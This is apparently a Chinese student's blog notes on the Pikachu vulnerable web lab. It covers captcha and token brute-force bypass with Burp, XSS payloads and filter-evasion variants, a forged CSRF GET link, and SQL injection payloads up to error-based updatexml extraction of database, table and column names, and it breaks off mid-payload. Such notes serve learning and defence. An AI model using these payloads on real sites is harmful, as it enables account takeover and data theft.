-<p>攻击结果中与结果标志无匹配的即是账号密码（也可根据返回数据包的长度进行判断）。</p>
-<ul>
-<li><strong>200</strong>：对于GET请求，浏览器会把http header和data一起发送出去，服务器响应200，请求成功；对于POST请求，浏览器先发送header，服务器会响应100（已经收到请求的第一部分，正在等待其余部分），浏览器再次发送data，服务器返回200，请求成功。</li>
-</ul>
-<h5 id="验证码绕过（on-client）"><a href="#验证码绕过（on-client）" class="headerlink" title="验证码绕过（on client）"></a>验证码绕过（on client）</h5><p><strong>验证码大致认证流程</strong>：</p>
-<p>客户端request登录页面，后台生成验证码：</p>
-<ol>
-<li><p>后台使用算法生成图片，并将图片response给客户端；</p>
-</li>
-<li><p>同时将算法生成的值全局赋值存到SESSION中；</p>
-</li>
-</ol>
-<p>校验验证码：</p>
-<ol>
-<li><p>客户端将认证信息和验证码一同提交；</p>
-</li>
-<li><p>后台对提交的验证码与SESSION里面的进行比较；</p>
-</li>
-</ol>
-<p>验证码算法中一般包含随机函数，所以每次刷新都会改变。</p>
-<p>将请求发送给Repeater（代理 HTTP历史记录 下有请求和响应，但是无法修改），修改验证码后发送，只出现<code>username or password is not exists～</code>的反馈，没有验证码错误提醒（与网站上输错验证码会弹窗反馈错误不同），说明验证码只在前端处理，不在后端验证，直接暴力破解即可。</p>
-<img src="D:\blog\coriiiander\source\_posts\pictures\Repeater.png" alt="Repeater" style="zoom:50%;" />
-
-<p>查看使用前端JavaScript实现验证码的源码：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> code; <span class="comment">//在全局 定义验证码</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">createCode</span>(<span class="params"></span>) &#123;</span><br><span class="line">        code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> codeLength = <span class="number">5</span>;<span class="comment">//验证码的长度</span></span><br><span class="line">        <span class="keyword">var</span> checkCode = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;checkCode&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> selectChar = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>);<span class="comment">//所有候选组成验证码的字符，当然也可以用中文的</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; codeLength; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> charIndex = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">36</span>);</span><br><span class="line">            code += selectChar[charIndex];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//alert(code);</span></span><br><span class="line">        <span class="keyword">if</span> (checkCode) &#123;</span><br><span class="line">            checkCode.<span class="property">className</span> = <span class="string">&quot;code&quot;</span>;</span><br><span class="line">            checkCode.<span class="property">value</span> = code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">validate</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> inputCode = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#bf_client .vcode&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">        <span class="keyword">if</span> (inputCode.<span class="property">length</span> &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;请输入验证码！&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (inputCode != code) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;验证码输入错误！&quot;</span>);</span><br><span class="line">            <span class="title function_">createCode</span>();<span class="comment">//刷新验证码</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">createCode</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="验证码绕过（on-server）"><a href="#验证码绕过（on-server）" class="headerlink" title="验证码绕过（on server）"></a>验证码绕过（on server）</h5><p>同上，修改验证码发送给repeater，响应反馈“验证码输入错误哦！”说明后台对验证码有所检验。</p>
-<p>但是还要检验<strong>验证码是否在后台过期</strong>。点击获取一个新的验证码，将其输入repeater请求，发送后提示username or password is not exists～，多次修改用户名和密码，验证码不变，点击运行，结果一样。说明验证码可以重复利用。</p>
-<p>验证码不变，进行暴力破解。</p>
-<blockquote>
-<p>验证码在后台不过期，导致可以长期被使用。验证码还是采用手动输入的方式的话，多多少少有点无聊……所以这正是验证码的防范作用所在吗？</p>
-</blockquote>
-<h5 id="token防爆破？"><a href="#token防爆破？" class="headerlink" title="token防爆破？"></a>token防爆破？</h5><blockquote>
-<p><strong>疑问</strong>：token？burpsuite中重定向是干什么的？</p>
-</blockquote>
-<blockquote>
-<p>token主要防的是CSRF攻击，因为它会在前端源码中输出，所以对暴力破解没有太大防范作用。</p>
-</blockquote>
-<p>打开开发者模式（F12），使用选择器，选中Login。在下面代码中发现一个hidden输入，name为token。</p>
-<img src="D:\blog\coriiiander\source\_posts\pictures\F12 token.png" alt="F12 token" style="zoom:50%;" />
-
-<p>爆破目标为管理员账户admin，选择Pitchfork模块。</p>
-<img src="D:\blog\coriiiander\source\_posts\pictures\爆破token.png" alt="爆破token" style="zoom:50%;" />
-
-<p>在Intruder的Options中找到Grep-Extract添加一个过滤条件，找到token值（End at delimiter不会填，选中下面的token自己就填好了）。</p>
-<img src="D:\blog\coriiiander\source\_posts\pictures\过滤条件.png" alt="过滤条件" style="zoom:50%;" />
-
-<p>在Intruder的Options中找到Redirections，将Follow redirections的Never改为Always。【？】</p>
-<img src="D:\blog\coriiiander\source\_posts\pictures\Redirections.png" alt="Redirections" style="zoom:50%;" />
-
-<p>点击Options找到Request Engin找到Number of threads 将其设置为1（每次获取一个token就进行一次尝试）。然后在Payloads中将字典1正常设置为Runtime（运行时文件）并将字典文件（txt里同上输几个）导入，将字典2设置为Recursive grep（递归搜索，不断在过滤条件中获得回复）并将刚才筛选到的token值作为第一个请求的输入。</p>
-<img src="D:\blog\coriiiander\source\_posts\pictures\token返回.png" alt="token返回" style="zoom:50%;" />
-
-
-
-<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p><strong>跨站脚本漏洞</strong> Cross-Site Scripting 为避免与前端叠成样式表缩写冲突，故又称XSS。分为如下几类：</p>
-<ol>
-<li>反射性XSS：交互的数据一般不会被存在在数据库里面，一次性，所见即所得，一般出现在查询类页面等。</li>
-<li>存储型XSS：交互的数据会被存在在数据库里面，永久性存储，一般出现在留言板，注册等页面。</li>
-<li>DOM型XSS：不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，一次性也属于反射型。</li>
-</ol>
-<p>危害：存储型&gt;反射型&gt; DOM型。</p>
-<p>XSS危害较大，是发生在前端浏览器端的漏洞。产生原因：程序对输入和输出没有做合适处理。<strong>解决方法</strong>：输入过滤、输出转义（根据输出点的位置对输出到前端的内容进行适当转义（如输出到html中进行html实体转义，输入到JS里面的进行js转义））</p>
-<p><strong>XSS(窃取cookie)攻击流程</strong>：</p>
-<img src="D:\blog\coriiiander\source\_posts\pictures\XSS(窃取cookie)攻击流程.png" alt="XSS(窃取cookie)攻击流程" style="zoom:67%;" />
-
-<p>POST型漏洞一般使用表单方式进行提交，无法直接使用URL进行攻击，POST型XSS基本原理如下：</p>
-<img src="D:\blog\coriiiander\source\_posts\pictures\POST型XSS.png" alt="POST型XSS" style="zoom: 33%;" />
-
-<h5 id="反射型XSS（get-post）"><a href="#反射型XSS（get-post）" class="headerlink" title="反射型XSS（get/post）"></a>反射型XSS（get/post）</h5><blockquote>
-<p><strong>疑问</strong>：GET？HTML语法？</p>
-</blockquote>
-<blockquote>
-<p>GET在url上有提交（特殊字符转化），POST没有。</p>
-</blockquote>
-<p>输入特殊字符，在页面源码查找（在哪里注入）发现原封不动输出。修改可输入大小后输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>被执行，出现xss弹窗。反射型，是一次性的，刷新页面之后弹窗消失。</p>
-<h5 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h5><p>存储型XSS下攻击者可将脚本注入到后台存储起来构成更加持久的危害，因此存储型XSS也称“永久型”XSS。其余同上。</p>
-<h5 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h5><p><strong>DOM：</strong></p>
-<img src="D:\blog\coriiiander\source\_posts\pictures\htmlDOM树.png" alt="htmlDOM树" style="zoom: 67%;" />
-
-<p>DOM 是一项 W3C (World Wide Web Consortium) 标准。它被分为 3 个不同的部分：</p>
-<ul>
-<li>Core DOM - 所有文档类型的标准模型</li>
-<li>XML DOM - XML 文档的标准模型</li>
-<li>HTML DOM - HTML 文档的标准模型（关于如何获取、更改、添加或删除 HTML 元素的标准）</li>
-</ul>
-<p>要改变页面内某个东西，JavaScript 需获得对HTML文档中所有元素进行访问的入口。这个入口连同对HTML元素进行添加、移动、改变或移除的方法和属性，都是通过文档对象模型来获得的（Document Object Model-DOM）。 DOM是纯前端操作，输出也是前端输出。</p>
-<p>随机输入出现A标签，查看源码：输入的字符串被拼接到了a标签当中。输入<code>#&#39; onclick=&quot;alert(666)”&gt;</code>，构成一个闭合<code>&lt;a href=&#39;#&#39; onclick=&quot;alert(666)&quot;&gt;&#39;&gt;what do you see?&lt;/a&gt;</code></p>
-<img src="D:\blog\coriiiander\source\_posts\pictures\DOMXSS源码.png" alt="DOMXSS源码" style="zoom:67%;" />
-
-<blockquote>
-<p>A标签：HTML语言标签，定义超链接，用于从一个页面链接到另一个页面。a元素最重要的属性是 href 属性，它指定链接的目标。</p>
-<p>href 属性：Hypertext Reference。意思是指定超链接目标的URL。href 属性的值可以是任何有效文档的相对或绝对URL，包括片段标识符和JavaScript代码段。</p>
-</blockquote>
-<h5 id="DOM型XSS-X"><a href="#DOM型XSS-X" class="headerlink" title="DOM型XSS - X"></a>DOM型XSS - X</h5><blockquote>
-<p><strong>疑问</strong>：没找到注入点也没弹窗，url？</p>
-</blockquote>
-<p>看源码发现是从url上获取的，类似于反射性。输入<code>#&#39; onclick=&quot;alert(666)”&gt;</code>，产生弹窗。</p>
-<h5 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h5><p>XSS盲打是一种攻击场景，只有后台会看到前端输入的内容，从前端无法判断是否存在XSS。等管理员在后台登录，如果有漏洞，就会xxx，攻击者并不能实时知道后台是否输出。如果在前端输入一段盗取cookie的脚本，管理员一登陆，管理员的cookie就会被获取，危害较大。</p>
-<p>输入<code>&lt;script&gt;alert(&#39;xni&#39;)&lt;/script&gt;</code>，点击提示，登录后台，看到弹窗。</p>
-<h5 id="XSS的过滤和绕过"><a href="#XSS的过滤和绕过" class="headerlink" title="XSS的过滤和绕过"></a>XSS的过滤和绕过</h5><p>后台过滤了<code>&lt;script&gt;</code>等特殊字符，但该标签可以如下各种方式编码：</p>
-<ul>
-<li><p>大小写：<code> &lt;SCRIPT&gt; aLeRT(111)&lt;/sCRIpt&gt;</code></p>
-</li>
-<li><p>拼凑：<code>&lt;scri&lt;script&gt; pt&gt; alert(111)&lt;/scri&lt;/script&gt; pt&gt;</code></p>
-</li>
-<li><p>注释干扰：<code>&lt;scri&lt;!--test--&gt; pt&gt; alert(111)&lt;/sc &lt;--test--&gt; ript&gt;</code></p>
-</li>
-<li><p>img标签添加事件处理函数onxxx()：<code>&lt;img src=x onerror=&quot;alert(666)&quot;&gt;</code></p>
-</li>
-</ul>
-<blockquote>
-<p>onerror 事件在视频/音频数据加载期间发生错误时触发。</p>
-</blockquote>
-<h5 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h5><blockquote>
-<p><strong>疑问</strong>：我的特殊字符没编码？</p>
-</blockquote>
-<blockquote>
-<p>htmlspecialchars()函数把预定义的字符转换为HTML实体。</p>
-</blockquote>
-<p>输入<code>viusy&#39; onclick=&#39;alert(666)&#39;</code>，<code>&lt;a href=&quot;viusy&quot; onclick=&quot;alert(666)&quot; &#39;=&quot;&quot;&gt;viusy&#39; onclick=&#39;alert(666)&#39;&lt;/a&gt;</code></p>
-<h5 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h5><blockquote>
-<p><strong>疑问：</strong>不会语法，Javascript在这里干什么？</p>
-</blockquote>
-<p>输入<code>Javascript:alert(666)</code>，<code> &lt;a href=&quot;Javascript:alert(666)&quot;&gt;阁下自己输入的url还请自己点一下吧&lt;/a&gt;a&gt;</code>。</p>
-<p>相应防范：只允许http/https，进行htmlspecialchars处理。</p>
-<h5 id="XSS之js输出"><a href="#XSS之js输出" class="headerlink" title="XSS之js输出"></a>XSS之js输出</h5><p>输入<code>x&#39;&lt;/script&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，先将前面的script闭合再插入我们自己的语句。</p>
-<p>buu pikachu没连上XSS的后台，载入不了配置的网址。下面三个我很感兴趣但是暂时学不了😭</p>
-<h5 id="XSS的危害-获取cookie的原理和演示"><a href="#XSS的危害-获取cookie的原理和演示" class="headerlink" title="XSS的危害 - 获取cookie的原理和演示"></a>XSS的危害 - 获取cookie的原理和演示</h5><h5 id="XSS危害-XSS进行钓鱼的原理和演示"><a href="#XSS危害-XSS进行钓鱼的原理和演示" class="headerlink" title="XSS危害 - XSS进行钓鱼的原理和演示"></a>XSS危害 - XSS进行钓鱼的原理和演示</h5><h5 id="XSS危害-XSS获取键盘记录原理和演示"><a href="#XSS危害-XSS获取键盘记录原理和演示" class="headerlink" title="XSS危害 - XSS获取键盘记录原理和演示"></a>XSS危害 - XSS获取键盘记录原理和演示</h5><h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><p>Cross-site request forgery 跨站请求伪造。在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。</p>
-<p>一个例子：小黑想要修改大白在某网站的密码，他对修改页面的链接进行伪装，在小白登录xxx网站后，欺骗他进行点击。小白点击这个链接后，个人信息就被修改了，小黑就完成了攻击目的。</p>
-<p><strong>CSRF攻击实现的关键</strong>：</p>
-<ol>
-<li>网站对关键信息（密码等）的操作（增删改）缺少校验，容易被伪造；</li>
-<li>点击链接时刚好登录在相关网站上；</li>
-</ol>
-<p>XSS攻击：小黑事先在xxx网的首页发现了一个XSS漏洞，欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，拿到小白的cookie，顺利登录到小白的后台，小黑自己修改小白的相关信息。</p>
-<p><strong>CSRF与XSS的区别</strong>：CSRF借用户的权限完成攻击，攻击者并没有拿到用户的权限；XSS是直接盗取到了用户的权限，然后实施破坏。 </p>
-<p><strong>防止CSRF攻击的方法</strong>：</p>
-<ul>
-<li>对敏感信息的操作增加安全的token / 安全的验证码 / 安全的逻辑流程（修改密码时要先校验旧密码 / 敏感信息的修改使用post而不是get / 通过http头部中的referer（Referer告诉服务器是从哪个页面链接过来的）来限制原页面）</li>
-<li>确认凭证的有效期（虽然退出或关闭了浏览器，但cookie仍有效或session并没有及时过期导致CSRF攻击变的简单）</li>
-<li>关于安全的会话管理（不在客户端保存敏感信息 / 退出时测试直接关闭的会话过期机制 / 设置如”15分钟内无操作，则登录超时”的会话过期机制）</li>
-</ul>
-<h5 id="CSRF（GET）"><a href="#CSRF（GET）" class="headerlink" title="CSRF（GET）"></a>CSRF（GET）</h5><blockquote>
-<p><strong>疑问：</strong>我访问不了这个网站</p>
-</blockquote>
-<p>登录并修改信息后，查看抓到的数据包。</p>
-<p><img src="D:\blog\coriiiander\source_posts\pictures\CSRF.png" alt="CSRF"></p>
-<p>我们的请求：<code>GET/vul/csrf/csrfget/csrf_get_edit.phpsex=vivi&amp;phonenum=110&amp;add=OUT&amp;email=pikapika&amp;submit=submit</code>，并没有看到防CSRF的token措施。更改get请求，修改地址，vince访问后信息就被修改。</p>
-<p><code>http://fd7d9d35-ebea-4aa5-84e2-b6f2afadb46c.node4.buuoj.cn:81/vul/csrf/csrfget/csrf_get_edit.phpsex=vivi&amp;phonenum=110&amp;add=OUT&amp;email=pika&amp;submit=submit</code></p>
-<h5 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h5><blockquote>
-<p>详细看看所有的php代码！</p>
-</blockquote>
-<p>信息修改页面有个hidden token，查看<code>pikachu/vul/csrf/csrftoken</code>文件下的<code>token_get_edit.php</code>，看到服务端会生成token。在对应文件<code>inc/function.php</code>里看到token的生成方式。token是一个很好的防御CSRF攻击的方法。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* token_get_edit.php */</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sex&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;phonenum&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;add&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]==<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>])&#123;</span><br><span class="line">        <span class="comment">//转义</span></span><br><span class="line">        <span class="variable">$getdata</span>=<span class="title function_ invoke__">escape</span>(<span class="variable">$link</span>, <span class="variable">$_GET</span>);</span><br><span class="line">        <span class="variable">$query</span>=<span class="string">&quot;update member set sex=&#x27;<span class="subst">&#123;$getdata[&#x27;sex&#x27;]&#125;</span>&#x27;,phonenum=&#x27;<span class="subst">&#123;$getdata[&#x27;phonenum&#x27;]&#125;</span>&#x27;,address=&#x27;<span class="subst">&#123;$getdata[&#x27;add&#x27;]&#125;</span>&#x27;,email=&#x27;<span class="subst">&#123;$getdata[&#x27;email&#x27;]&#125;</span>&#x27; where username=&#x27;<span class="subst">&#123;$_SESSION[&#x27;csrf&#x27;][&#x27;username&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">execute</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">        <span class="comment">//没有修改，点击提交，也算修改成功</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_affected_rows</span>(<span class="variable">$link</span>)==<span class="number">1</span> || <span class="title function_ invoke__">mysqli_affected_rows</span>(<span class="variable">$link</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:token_get.php&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$html1</span>.=<span class="string">&quot;&lt;p&gt;修改失败,请重新登录&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//生成token</span></span><br><span class="line"><span class="title function_ invoke__">set_token</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* function.php */</span></span><br><span class="line"><span class="comment">//生成一个token,以当前微妙时间+一个5位的前缀</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_token</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">       <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(<span class="number">10000</span>,<span class="number">99999</span>),<span class="literal">true</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL-Inject"></a>SQL-Inject</h4><blockquote>
-<p>SQL-Inject内容真的好多…</p>
-</blockquote>
-<p>SQL注入漏洞主要形成原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。从而导致数据库受损（被脱库、被删除、甚至整个服务器权限沦陷）。</p>
-<p><strong>防范：</strong>过滤，不允许危险字符传入；</p>
-<p><strong>SQL Inject 漏洞攻击流程</strong>：</p>
-<ol>
-<li>注入点探测 - 自动方式：使用web漏洞扫描工具，自动进行注入点发现；手动方式:手工构造sql inject测试语句进行注入点发现。</li>
-<li>信息获取 - 环境信息：数据库类型，数据库版本，操作系统版本，用户信息等。数据库信息：数据库名称，数据库表，表字段，字段内容（加密内容破解）。</li>
-<li>获取操作系统权限 - 通过数据库执行shell，上传木马。</li>
-</ol>
-<p><strong>常见的注入点类型：</strong></p>
-<p>数字型 <code>user_ id= $id</code></p>
-<p>字符型<code>user. id= &#39;$id&#39;</code></p>
-<p>搜索型<code>text LIKE &#39;%&#123;$_ GET[&#39;search&#39;]&#125;%&#39;&quot;</code></p>
-<h5 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h5><h5 id="字符型注入（get）"><a href="#字符型注入（get）" class="headerlink" title="字符型注入（get）"></a>字符型注入（get）</h5><p>请求在url中，后台接收：<code>$username=$_GET[&#39;username&#39;]</code>。字符串含单引号 <code>select 字段1，字段2 from 表名 where username = &#39;111&#39;;</code>，因此输入<code>1&#39; or 1=1 #</code>。</p>
-<h5 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h5><p>返回所有含有k的用户<code>select from 表名 where username like &#39; %k% &#39;;</code></p>
-<h5 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h5><blockquote>
-<p><strong>疑问</strong>：）？</p>
-</blockquote>
-<p>出现语法报错，说明输入的单引号已经被拼接到SQL里面了，也就是存在SQL注入漏洞的。</p>
-<p>无论什么型，构造出闭合就行。实际环境看不到源码，进行试探<code>xx&#39;) or 1=1 #</code></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="comment">//这里没有做任何处理，直接拼到select里面去了</span></span><br><span class="line">    <span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="comment">//这里的变量是字符型，需要考虑闭合</span></span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;select id,email from member where username=(&#x27;<span class="subst">$name</span>&#x27;)&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">execute</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="variable">$id</span>=<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">            <span class="variable">$email</span>=<span class="variable">$data</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">            <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;your uid:<span class="subst">&#123;$id&#125;</span> &lt;br /&gt;your email is: <span class="subst">&#123;$email&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="”select-update-insert-delete“注入"><a href="#”select-update-insert-delete“注入" class="headerlink" title="”select/update/insert/delete“注入"></a>”select/update/insert/delete“注入</h5><blockquote>
-<p><strong>疑问</strong>：updatexml()，concat() ？limit 0,1？</p>
-</blockquote>
-<p><strong>基于报错的信息获取。</strong>后台没有屏蔽数据库报错信息，在语法发生错误时会输出在前端。</p>
-<blockquote>
-<p>三个常用的用来报错的函数<br>**updatexml()**：对XML文档数据进行查询和修改的XPATH函数。<br>**extractvalue()**：对XML文档数据进行查询的XPATH函数。<br>**floor()**：用来取整的函数。</p>
-</blockquote>
-<p><code>UPDATEXML (xml document, XPathstring, new_value)</code></p>
-<ul>
-<li>第一个参数：String格式，表中的字段名。</li>
-<li>第二个参数：XPathstring（Xpath格式的字符串）。</li>
-<li>第三个参数：new_value，String格式，替换查找到的符合条件的。</li>
-</ul>
-<p>构造报错：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and updatexml(1,version(),0)#</span></span><br></pre></td></tr></table></figure>
-
-<img src="D:\blog\coriiiander\source\_posts\pictures\sql报错.jpg" alt="sql报错" style="zoom:60%;" />
-
-<p>并没有得到version对应的版本号，改造如下，version()可替换成任意想要获得的东西。</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and updatexml(1,concat(0x7e,version()),0)#</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database()),<span class="number">0</span>)#</span><br></pre></td></tr></table></figure>
-
-<img src="D:\blog\coriiiander\source\_posts\pictures\sql报错2.png" alt="sql报错2" style="zoom:60%;" />
-
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27;)),0)#</span></span><br></pre></td></tr></table></figure>
-
-<img src="D:\blog\coriiiander\source\_posts\pictures\sql报错3.png" alt="sql报错3" style="zoom:60%;" />
-
-<p>报错有多行，使用limit一次一次进行获取表名。</p>
-<blockquote>
-<p><strong>疑问</strong>：前两个没太明白？</p>
-</blockquote>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27; limit 0,1)),0)#</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)#</span><br><span class="line">kobe<span class="string">&#x27; and 